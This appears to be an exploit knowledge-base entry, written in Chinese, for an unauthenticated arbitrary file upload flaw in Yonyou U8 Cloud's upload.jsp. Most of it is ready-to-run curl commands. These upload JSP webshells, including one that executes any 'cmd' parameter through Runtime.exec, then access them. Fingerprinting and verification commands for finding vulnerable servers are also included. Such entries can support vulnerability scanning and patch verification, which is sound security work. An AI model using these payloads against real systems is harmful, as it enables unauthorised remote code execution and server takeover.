---
id: YONGYOU-U8-CLOUD-UPLOAD
title: 用友 U8 Cloud upload.jsp 任意文件上传漏洞
product: yongyou
vendor: 用友网络
version_affected: "用友 U8 Cloud all versions"
severity: CRITICAL
tags: [file_upload, rce, 无需认证, 国产, oa]
fingerprint: ["U8 cloud", "开启U8 cloud云端之旅"]
---

## 漏洞描述

用友 U8 Cloud 的 upload.jsp 文件存在任意文件上传漏洞，攻击者无需认证即可通过 POST 请求上传任意 JSP 文件到服务器，上传的文件直接保存在 Web 可访问目录下，可实现远程代码执行。

## 影响版本

- 用友 U8 Cloud（所有已知版本）

## 前置条件

- 无需认证
- 目标运行用友 U8 Cloud

## 利用步骤

1. 确认目标为用友 U8 Cloud
2. 向 `/linux/pages/upload.jsp` 发送 POST 请求，通过 filename header 指定文件名
3. POST body 中包含 JSP webshell 代码
4. 访问上传的 webshell

## Payload

```bash
curl -s "http://target/linux/pages/upload.jsp" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "filename: shell.jsp" \
  -d '<% out.println("VULN_TEST"); %>'
```

上传后访问：

```bash
curl -s "http://target/linux/shell.jsp"
```

**上传命令执行 webshell**

```bash
curl -s "http://target/linux/pages/upload.jsp" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "filename: cmd.jsp" \
  -d '<%Runtime.getRuntime().exec(request.getParameter("cmd"));out.println("OK");%>'
```

## 验证方法

```bash
# 上传测试文件
curl -s "http://target/linux/pages/upload.jsp" \
  -X POST -H "filename: test_vuln.jsp" \
  -d '<% out.println("VULN_CONFIRMED"); %>'

# 验证上传成功
curl -s "http://target/linux/test_vuln.jsp" | grep "VULN_CONFIRMED"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "U8 cloud\|云端之旅"
curl -s "http://target/linux/pages/upload.jsp" -o /dev/null -w "%{http_code}"
```
